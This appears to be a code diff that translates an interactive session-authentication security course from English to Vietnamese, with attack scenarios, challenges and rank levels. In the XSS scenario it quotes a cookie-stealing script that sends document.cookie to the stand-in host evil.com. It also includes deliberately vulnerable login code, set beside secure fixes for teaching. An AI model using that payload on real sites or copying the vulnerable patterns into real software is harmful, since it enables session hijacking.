       threatLevel: 'LOW',
-      attack: `You log into NeoTech's portal at a public library. You finish your work, close the browser
-tab (but don't click "Logout"), and leave. The session cookie remains valid in the browser.`,
-      exploitation: `The next person on that computer opens a new tab and navigates to neotech.com. The
-browser automatically sends your still-valid session cookie. The server validates it and grants access.
-They're now browsing as you, viewing your data, possibly making changes.`,
-      defense: `Implement short idle timeouts (15-30 minutes). Use sliding expiration - extend timeout
-on activity, but not indefinitely. Offer "Logout all devices" feature. Educate users about public computer
-risks. Consider prompting "Are you on a public computer?" and offering single-session mode.`,
-      interactive: 'Set different timeout values and observe session expiration behavior'
+      attack: `Bạn dùng máy ở thư viện, làm việc xong tắt tab (nhưng QUÊN click Logout).
+Session cookie vẫn còn lưu trong browser.`,
+      exploitation: `Người tiếp theo mở web lên. Browser tự động gửi cookie cũ của bạn.
+Server thấy hợp lệ → Họ vào được tài khoản của bạn.`,
+      defense: `Set thời gian hết hạn ngắn (15-30 phút). Dùng sliding expiration.
+Có tính năng "Đăng xuất từ xa". Cảnh báo user khi dùng máy lại.`,
+      interactive: 'Thử chỉnh timeout và xem session hết hạn'
     }
   ],
 
   challenges: [
     {
       id: 'challenge-1',
-      name: 'Decode the Breach',
+      name: 'Giải Mã Cookie',
       difficulty: 'EASY',
-      description: `You've intercepted a session cookie from a poorly secured application. Examine its
-attributes and identify the security vulnerabilities. Add the missing security flags to make it secure.`,
-      startingCode: `// Vulnerable cookie configuration
+      description: `Bạn vừa bắt được một session cookie từ một website bảo mật kém.
+Hãy xem cấu hình của nó và tìm ra các lỗ hổng. Thêm các cờ bảo mật còn thiếu để vá lỗi.`,
+      startingCode: `// Cấu hình cookie hiện tại (LỖI)
 res.cookie('sessionId', sessionId, {
-  maxAge: 24 * 60 * 60 * 1000 // 24 hours
+  maxAge: 24 * 60 * 60 * 1000 // 24 giờ
 });`,
-      successCriteria: ['Add httpOnly flag', 'Add secure flag', 'Add sameSite=strict', 'Reduce maxAge to 30 minutes'],
+      successCriteria: [
+        'Thêm cờ httpOnly (Chống XSS)',
+        'Thêm cờ secure (Chỉ HTTPS)',
+        'Thêm sameSite=strict (Chống CSRF)',
+        'Giảm maxAge xuống 30 phút (Hạn chế rủi ro)'
+      ],
       badge: 'Security Initiate',
-      reward: 'Shield icon badge + 10% progress'
+      reward: 'Huy hiệu Khiên Đồng + 10% progress'
     },
     {
       id: 'challenge-2',
-      name: 'Build the Fort',
+      name: 'Xây Dựng Pháo Đài',
       difficulty: 'MEDIUM',
-      description: `Implement a complete, production-ready session creation flow. Your code must hash
-passwords, generate secure session IDs, store sessions, and set properly configured cookies.`,
-      startingCode: `// TODO: Complete this login endpoint
+      description: `Hãy code một quy trình đăng nhập hoàn chỉnh. Yêu cầu:
+Hash password, tạo session ID an toàn, lưu session và set cookie chuẩn bảo mật.`,
+      startingCode: `// TODO: Hoàn thành API login này
 app.post('/login', async (req, res) => {
   const { username, password } = req.body;
 
@@ -554,22 +1712,22 @@ app.post('/login', async (req, res) => {
   // TODO: Return success response
 });`,
       successCriteria: [
-        'Use bcrypt for password verification',
-        'Generate crypto-random session ID (32 bytes)',
-        'Store session with expiration',
-        'Set cookie with all 4 security attributes',
-        'Handle errors properly'
+        'Dùng bcrypt để verify password',
+        'Tạo session ID ngẫu nhiên (32 bytes)',
+        'Lưu session có thời hạn',
+        'Set cookie với đủ 4 cờ bảo mật',
+        'Xử lý lỗi đúng cách'
       ],
       badge: 'Auth Architect',
-      reward: 'Star icon badge + 15% progress'
+      reward: 'Huy hiệu Kiến Trúc Sư + 15% progress'
     },
     {
       id: 'challenge-3',
-      name: 'Hunt the Hacker',
+      name: 'Săn Lùng Hacker',
       difficulty: 'HARD',
-      description: `This code has FIVE critical vulnerabilities that make it hackable. Find them all
-and patch each one. Vulnerabilities range from XSS exposure to session fixation to timing attacks.`,
-      startingCode: `// VULNERABLE CODE - Find and fix 5 security issues
+      description: `Đoạn code này có 5 LỖI BẢO MẬT nghiêm trọng.
+Hãy tìm và sửa tất cả. Từ XSS, Session Fixation đến Timing attacks.`,
+      startingCode: `// CODE LỖI - Tìm và sửa 5 lỗi
 app.post('/login', async (req, res) => {
   const { username, password, sessionId } = req.body;
 
@@ -585,14 +1743,14 @@ app.post('/login', async (req, res) => {
   res.json({ success: true, user: user });
 });`,
       successCriteria: [
-        'Fix #1: Hash password comparison (bcrypt)',
-        'Fix #2: Never accept client session IDs',
-        'Fix #3: Use crypto-random ID generation',
-        'Fix #4: Add cookie security flags',
-        'Fix #5: Don\'t return sensitive user data'
+        'Fix #1: Dùng bcrypt.compare (Chống lộ pass)',
+        'Fix #2: KHÔNG nhận session ID từ client (Chống Fixation)',
+        'Fix #3: Dùng crypto.randomBytes (Chống đoán ID)',
+        'Fix #4: Thêm security flags cho cookie',
+        'Fix #5: Không trả về user data nhạy cảm'
       ],
       badge: 'Security Guardian',
-      reward: 'Award icon badge + 25% progress'
+      reward: 'Huy hiệu Bảo Vệ + 25% progress'
     }
   ],
 
@@ -600,33 +1758,33 @@ app.post('/login', async (req, res) => {
     levels: [
       {
         id: 'protocol-initiate',
-        name: 'Protocol Initiate',
+        name: 'Tân Binh Giao Thức',
         range: [0, 30],
-        description: 'You understand the basics of session authentication',
+        description: 'Bạn đã hiểu những kiến thức cơ bản về session authentication',
         icon: 'Shield',
         color: 'text-blue-400'
       },
       {
         id: 'security-operative',
-        name: 'Security Operative',
+        name: 'Chiến Binh Bảo Mật',
         range: [31, 60],
-        description: 'You can implement production-ready session auth',
+        description: 'Bạn có thể triển khai session auth an toàn ở môi trường production',
         icon: 'ShieldCheck',
         color: 'text-neon-400'
       },
       {
         id: 'elite-guardian',
-        name: 'Elite Guardian',
+        name: 'Hộ Vệ Tinh Nhuệ',
         range: [61, 90],
-        description: 'You master advanced security patterns and scaling',
+        description: 'Bạn đã làm chủ các kỹ thuật bảo mật nâng cao và scaling',
         icon: 'ShieldAlert',
         color: 'text-purple-400'
       },
       {
         id: 'master-architect',
-        name: 'Master Architect',
+        name: 'Đại Kiến Trúc Sư',
         range: [91, 100],
-        description: 'You have achieved complete mastery of session authentication',
+        description: 'Bạn đã oàn toàn làm chủ nghệ thuật session authentication',
         icon: 'Award',
         color: 'text-yellow-400'
       }
@@ -957,7 +2115,49 @@ def logout():
 
     return response`
     }
-  ]
+  ],
+
+  achievements: {
+    protocolInitiate: {
+      title: 'Khách Tham Quan',
+      description: 'Hoàn thành các bài học cơ bản về Session',
+      icon: 'User',
+      color: 'text-green-400',
+    },
+    securityOperative: {
+      title: 'Bảo Vệ Tòa Nhà',
+      description: 'Nắm vững quy trình logout và bảo mật cookie',
+      icon: 'Shield',
+      color: 'text-blue-400',
+    },
+    eliteGuardian: {
+      title: 'Trưởng An Ninh',
+      description: 'Hoàn thành bài học và vượt qua 2 thử thách',
+      icon: 'ShieldCheck',
+      color: 'text-purple-400',
+    },
+    masterArchitect: {
+      title: 'Kiến Trúc Sư Hệ Thống',
+      description: 'Làm chủ hoàn toàn Session Authentication',
+      icon: 'Crown',
+      color: 'text-yellow-400',
+    },
+  },
+
+  crossReferences: {
+    jwt: {
+      title: 'So Sánh: JWT',
+      comparison: 'Session dùng Server lưu trạng thái (Stateful). JWT chứa thông tin trong Token (Stateless).',
+    },
+    mfa: {
+      title: 'Nâng Cao: MFA',
+      comparison: 'Kết hợp MFA để bảo vệ bước đăng nhập trước khi tạo Session.',
+    },
+    oauth: {
+      title: 'Mở Rộng: OAuth 2.0',
+      comparison: 'Dùng Google/Facebook để đăng nhập tạo Session thay vì dùng mật khẩu.',
+    },
+  },
 };
 
 /**
@@ -965,152 +2165,156 @@ def logout():
  */
 export const securityScenarios = [
   {
-    id: 'scenario-1',
-    title: 'The Cookie Thief: XSS Session Hijacking',
+    id: 'xss-cookie-theft',
+    title: 'Đánh cắp Cookie qua XSS',
     threatLevel: 'HIGH' as const,
-    attack: `A hacker injects malicious JavaScript into your web app via an unvalidated comment field. The script executes: <script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>. If HTTP-Only is FALSE, the attacker receives your session cookie instantly.`,
-    exploitation: `The attacker now has your session ID. They set it in their browser and refresh the page. The server sees a valid session cookie, validates it, and grants full access. The attacker is now logged in as YOU - with all your permissions, data access, and account control.`,
-    defense: `Set HTTP-Only=true on cookies. This flag makes cookies inaccessible to JavaScript - document.cookie returns empty. The XSS attack still happens, but it can't steal sessions. Additionally, use Content Security Policy (CSP) headers to prevent inline scripts altogether.`,
+    attack: 'Hacker chèn mã JavaScript độc hại vào website (ví dụ qua bình luận). Đoạn script này đọc session cookie của nạn nhân và gửi về server của hacker.',
+    exploitation: 'Nếu cookie không có flag HttpOnly, hacker dùng `fetch("evil.com?c=" + document.cookie)` để lấy Session ID. Sau đó hacker dùng ID này để mạo danh nạn nhân.',
+    defense: 'BẮT BUỘC set flag `httpOnly: true`. Web browser sẽ chặn JavaScript đọc cookie này. Ngoài ra nên dùng Content Security Policy (CSP).',
     vulnerableCode: {
       language: 'javascript' as const,
-      label: 'Vulnerable Code',
-      code: `// VULNERABLE - JavaScript can access cookie
+      label: 'Nguy Hiểm (Vulnerable)',
+      code: `// BAD: Cookie accessible to JavaScript
 res.cookie('sessionId', sessionId, {
-  secure: true,
-  sameSite: 'strict'
-  // Missing httpOnly flag!
-});
-
-// Attacker's XSS payload:
-// <script>
-//   fetch('https://evil.com/steal?cookie=' + document.cookie)
-// </script>`
-    },
-    secureCode: {
-      language: 'javascript' as const,
-      label: 'Secure Code',
-      code: `// SECURE - Cookie protected from JavaScript
-res.cookie('sessionId', sessionId, {
-  httpOnly: true,    // Blocks document.cookie access
-  secure: true,
-  sameSite: 'strict'
-});
-
-// Add CSP header to prevent XSS
-res.setHeader(
-  'Content-Security-Policy',
-  "script-src 'self'; object-src 'none';"
-);`
-    }
-  },
-  {
-    id: 'scenario-2',
-    title: 'The Session Fixer: ID Fixation Attack',
-    threatLevel: 'MEDIUM' as const,
-    attack: `An attacker sends you a link: neotech.com/login?sessionId=HACKER_CONTROLLED. You click it and log in successfully. The server, if poorly coded, accepts the session ID from the URL and uses it for your authenticated session.`,
-    exploitation: `The attacker already knows the session ID (they generated it). They don't need to steal anything - they SET it beforehand. After you log in, they simply use that same session ID to access your account. You did the work of logging in FOR them.`,
-    defense: `ALWAYS regenerate session ID after successful login. Never accept client-provided session IDs. The server must generate a fresh, cryptographically random ID and invalidate any existing session. This simple step makes fixation attacks impossible.`,
-    vulnerableCode: {
-      language: 'javascript' as const,
-      label: 'Vulnerable Code',
-      code: `// VULNERABLE - Accepts client-provided session ID
-app.post('/login', async (req, res) => {
-  const user = await verifyCredentials(req.body);
-
-  // DANGER: Using session ID from query string!
-  const sessionId = req.query.sessionId || generateSessionId();
-
-  await db.sessions.create({ id: sessionId, userId: user.id });
-  res.cookie('sessionId', sessionId);
-  res.json({ success: true });
-});`
-    },
-    secureCode: {
-      language: 'javascript' as const,
-      label: 'Secure Code',
-      code: `// SECURE - Always regenerate session ID
-app.post('/login', async (req, res) => {
-  const user = await verifyCredentials(req.body);
-
-  // Delete old session if exists
-  if (req.cookies.sessionId) {
-    await db.sessions.delete({ id: req.cookies.sessionId });
-  }
-
-  // ALWAYS generate new ID server-side
-  const sessionId = crypto.randomBytes(32).toString('hex');
-
-  await db.sessions.create({ id: sessionId, userId: user.id });
-  res.cookie('sessionId', sessionId, { httpOnly: true, secure: true });
-  res.json({ success: true });
-});`
-    }
-  },
-  {
-    id: 'scenario-3',
-    title: 'The Forgotten Logout: Shared Computer Risk',
-    threatLevel: 'LOW' as const,
-    attack: `You log into NeoTech's portal at a public library. You finish your work, close the browser tab (but don't click "Logout"), and leave. The session cookie remains valid in the browser.`,
-    exploitation: `The next person on that computer opens a new tab and navigates to neotech.com. The browser automatically sends your still-valid session cookie. The server validates it and grants access. They're now browsing as you, viewing your data, possibly making changes.`,
-    defense: `Implement short idle timeouts (15-30 minutes). Use sliding expiration - extend timeout on activity, but not indefinitely. Offer "Logout all devices" feature. Educate users about public computer risks. Consider prompting "Are you on a public computer?" and offering single-session mode.`,
-    vulnerableCode: {
-      language: 'javascript' as const,
-      label: 'Vulnerable Code',
-      code: `// VULNERABLE - Long session timeout
-res.cookie('sessionId', sessionId, {
-  httpOnly: true,
-  secure: true,
-  maxAge: 24 * 60 * 60 * 1000  // 24 hours - TOO LONG!
-});`
-    },
-    secureCode: {
-      language: 'javascript' as const,
-      label: 'Secure Code',
-      code: `// SECURE - Short timeout with sliding expiration
-res.cookie('sessionId', sessionId, {
-  httpOnly: true,
   secure: true,
   sameSite: 'strict',
-  maxAge: 30 * 60 * 1000  // 30 minutes - reasonable
+  // Missing httpOnly: true
 });
 
-// Middleware to update lastActivity
-async function updateSessionActivity(req, res, next) {
-  if (req.cookies.sessionId) {
-    await db.sessions.update(
-      { id: req.cookies.sessionId },
-      { lastActivity: Date.now() }
-    );
-  }
-  next();
-}`
-    }
-  }
-];
+// Attacker can now steal it:
+// <script>fetch('https://evil.com?c=' + document.cookie)</script>`,
+    },
+    secureCode: {
+      language: 'javascript' as const,
+      label: 'An Toàn (Secure)',
+      code: `// GOOD: HttpOnly prevents JavaScript access
+res.cookie('sessionId', sessionId, {
+  httpOnly: true,     // Cookie invisible to JavaScript
+  secure: true,
+  sameSite: 'strict',
+});
 
+// Also add CSP header
+res.setHeader('Content-Security-Policy', "script-src 'self'");
+
+// Now document.cookie will NOT include sessionId`,
+    },
+  },
+  {
+    id: 'session-fixation',
+    title: 'Tấn công Session Fixation',
+    threatLevel: 'HIGH' as const,
+    attack: 'Hacker tạo sẵn một Session ID hợp lệ, sau đó lừa nạn nhân đăng nhập bằng ID này (ví dụ gửi link `login?sid=123`).',
+    exploitation: 'Nếu server không tạo ID mới sau khi login, nạn nhân sẽ dùng chung Session ID với hacker. Hacker lúc này ung dung truy cập tài khoản của nạn nhân.',
+    defense: 'LUÔN LUÔN tạo mới (regenerate) session ID ngay sau khi đăng nhập thành công. Vô hiệu hóa session cũ ngay lập tức.',
+    vulnerableCode: {
+      language: 'javascript' as const,
+      label: 'Nguy Hiểm (Vulnerable)',
+      code: `// BAD: Reuses existing session ID
+app.post('/login', async (req, res) => {
+  const user = await verifyCredentials(req.body);
+
+  // Just updates existing session - DANGEROUS!
+  const sessionId = req.cookies.sessionId || generateSessionId();
+  await db.sessions.update({ userId: user.id }, { where: { sessionId } });
+
+  res.cookie('sessionId', sessionId);
+  // Attacker's preset session ID is now authenticated
+});`,
+    },
+    secureCode: {
+      language: 'javascript' as const,
+      label: 'An Toàn (Secure)',
+      code: `// GOOD: Always regenerate session ID on login
+app.post('/login', async (req, res) => {
+  const user = await verifyCredentials(req.body);
+
+  // Delete old session
+  const oldSessionId = req.cookies.sessionId;
+  if (oldSessionId) {
+    await db.sessions.delete({ where: { sessionId: oldSessionId } });
+  }
+
+  // Create NEW session with NEW ID
+  const newSessionId = crypto.randomBytes(32).toString('hex');
+  await db.sessions.create({
+    sessionId: newSessionId,
+    userId: user.id,
+  });
+
+  res.cookie('sessionId', newSessionId, { httpOnly: true, secure: true });
+  // Attacker's old session ID is now useless
+});`,
+    },
+  },
+  {
+    id: 'forgotten-logout',
+    title: 'Quên Đăng Xuất (Máy Công Cộng)',
+    threatLevel: 'MEDIUM' as const,
+    attack: 'Nạn nhân dùng máy tính công cộng (quán net, thư viện) nhưng quên đăng xuất. Session cookie vẫn còn hiệu lực trên trình duyệt.',
+    exploitation: 'Người dùng tiếp theo mở trình duyệt lên, vào website và TỰ ĐỘNG đăng nhập vào tài khoản nạn nhân.',
+    defense: 'Cấu hình session timeout ngắn (15-30p). Nên có Absolute Timeout (tự hủy sau 8h dù đang dùng). Hiển thị danh sách thiết bị đang active.',
+    secureCode: {
+      language: 'javascript' as const,
+      label: 'Giải Pháp (Secure Implementation)',
+      code: `// Implement both idle timeout and absolute expiration
+const SESSION_IDLE_TIMEOUT = 30 * 60 * 1000; // 30 minutes
+const SESSION_ABSOLUTE_TIMEOUT = 8 * 60 * 60 * 1000; // 8 hours
+
+async function validateSession(sessionId) {
+  const session = await db.sessions.findOne({ where: { sessionId } });
+
+  if (!session) return null;
+
+  const now = new Date();
+
+  // Check absolute expiration
+  if (now > session.expiresAt) {
+    await db.sessions.delete({ where: { sessionId } });
+    return null;
+  }
+
+  // Check idle timeout
+  const idleTime = now - session.lastActivity;
+  if (idleTime > SESSION_IDLE_TIMEOUT) {
+    await db.sessions.delete({ where: { sessionId } });
+    return null;
+  }
+
+  // Update last activity
+  await db.sessions.update(
+    { lastActivity: now },
+    { where: { sessionId } }
+  );
+
+  return session;
+}`,
+    },
+  },
+];
 /**
  * Challenge exports with proper typing
  */
 export const challenges = [
   {
-    id: 'challenge-1',
-    title: 'Decode the Breach',
+    id: 'decode-breach',
+    title: 'Giải Mã Vụ Rò Rỉ',
+    description: 'Bạn vừa bắt được một session cookie từ hệ thống bị hack. Hãy phân tích xem nó thiếu attribute bảo mật nào và giải thích cách hacker khai thác.',
     difficulty: 'Easy' as const,
-    description: `You've intercepted a session cookie from a poorly secured application. Examine its attributes and identify the security vulnerabilities. Add the missing security flags to make it secure.`,
-    points: 100
+    points: 100,
   },
   {
-    id: 'challenge-2',
-    title: 'Build the Fort',
+    id: 'build-fort',
+    title: 'Xây Dựng Pháo Đài',
+    description: 'Viết hàm tạo session an toàn: phải xác thực user, tạo ID ngẫu nhiên, lưu database và set cookie với đầy đủ cờ bảo mật (HttpOnly, Secure).',
     difficulty: 'Medium' as const,
-    description: `Implement a complete, production-ready session creation flow. Your code must hash passwords, generate secure session IDs, store sessions, and set properly configured cookies.`,
-    points: 250
+    points: 250,
   },
   {
-    id: 'challenge-3',
-    title: 'Hunt the Hacker',
+    id: 'hunt-hacker',
+    title: 'Săn Lùng Hacker',
+    description: 'Review đoạn code có 5 lỗ hổng chết người: session fixation, XSS cookie theft, CSRF, timing attack và lưu trữ kém. Hãy vá lại tất cả!',
     difficulty: 'Hard' as const,
-    description: `This code has FIVE critical vulnerabilities that make it hackable. Find them all and patch each one. Vulnerabilities range from XSS exposure to session fixation to timing attacks.`,
-    points: 500
-  }
+    points: 500,
+  },
 ];
